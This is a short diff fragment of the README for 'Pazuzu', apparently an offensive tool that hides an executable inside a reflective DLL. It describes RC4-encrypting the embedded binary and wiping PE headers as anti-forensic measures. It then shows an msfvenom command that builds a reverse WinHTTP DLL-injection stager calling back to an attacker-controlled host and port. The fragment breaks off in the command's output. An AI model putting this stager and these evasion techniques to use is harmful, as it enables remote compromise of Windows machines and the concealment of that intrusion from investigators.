@@ -21,7 +21,7 @@ For example, if you want to exploit a vulnerability and run your own executable 
 * Pazuzu also provides some additional features. For example, the **-x** option will encrypt the section containing the binary by using a random RC4 key (which is stored in the DLL TimeStamp). In addition, after running it the PE header of the DLL and the binary section will be overwritten with zeros. I will add more anti-forensic techniques in future versions.
 
 **Examples**
-* To recover the Pazuzu DLL I will use a WinHTTP stager:
+* To get the Pazuzu DLL I will use a WinHTTP stager:
 ```
 root@kali:~# msfvenom -p windows/dllinject/reverse_winhttp lhost=192.168.1.44 lport=8080 dll=. -f exe -o Winhttp-stager.exe
 No platform was selected, choosing Msf::Module::Platform::Windows from the payload
